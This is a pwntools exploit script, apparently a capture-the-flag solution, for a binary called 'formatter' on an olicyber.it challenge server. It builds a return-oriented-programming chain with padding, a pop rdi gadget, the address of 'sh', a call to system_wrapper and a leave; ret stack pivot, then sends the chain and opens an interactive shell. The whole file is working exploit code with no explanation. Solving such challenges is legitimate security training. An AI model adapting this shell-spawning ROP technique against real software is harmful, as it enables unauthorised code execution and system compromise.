from pwn import *

context.binary = elf = ELF('./formatter')
context.terminal = ('kgx', '-e')

if args.REMOTE:
    r = remote('formatter.challs.olicyber.it', 20006)
elif args.GDB:
    r = gdb.debug('./formatter', '''
                  b *main+57
                  b *0x4014FA
                  b format
                  c
                  jump *main+62
                  ''')
else:
    r = process('./formatter')
    

payload =  b'\\\x00'*8
payload += p64(0x4015e3)                        # pop rdi; ret
payload += p64(elf.search(b'sh\x00').__next__())
payload += p64(elf.sym['system_wrapper'])       
payload += b'\\\x00'*4
payload += p64(0x4050A8)                        # new stack base, just above pop rdi; ret
payload += p64(0x401574)                        # main + 120 (leave; ret)

# print(len(payload))

r.sendlineafter(b'.\n', payload)
r.interactive()
